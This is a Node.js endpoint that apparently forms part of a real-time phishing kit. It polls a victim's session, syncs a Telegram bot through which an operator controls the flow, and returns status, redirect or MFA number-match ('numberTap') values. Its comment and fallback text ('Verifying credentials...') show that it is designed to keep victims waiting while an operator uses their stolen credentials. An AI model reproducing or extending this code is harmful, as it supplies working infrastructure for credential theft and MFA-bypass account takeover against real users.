const { loadConfig, getSessionAsync, syncTelegramUpdates } = require('./_store');

module.exports = async (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

  const sessionId = req.query.sessionId || req.query.id;
  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId parameter' });
  }

  const config = loadConfig();
  if (config.telegram_bot_token) {
    try {
      await syncTelegramUpdates(config.telegram_bot_token);
    } catch (e) {}
  }

  const session = await getSessionAsync(sessionId);
  if (session) {
    const resp = {
      sessionId,
      status: session.status || 'pending',
      message: session.message || 'Please wait...'
    };
    if (session.redirect) resp.redirect = session.redirect;
    if (session.numberTap) resp.numberTap = session.numberTap;
    return res.status(200).json(resp);
  }

  // Active session waiting for operator response: never return 404 to avoid breaking polling
  return res.status(200).json({
    sessionId,
    status: 'pending',
    message: 'Verifying credentials...'
  });
};
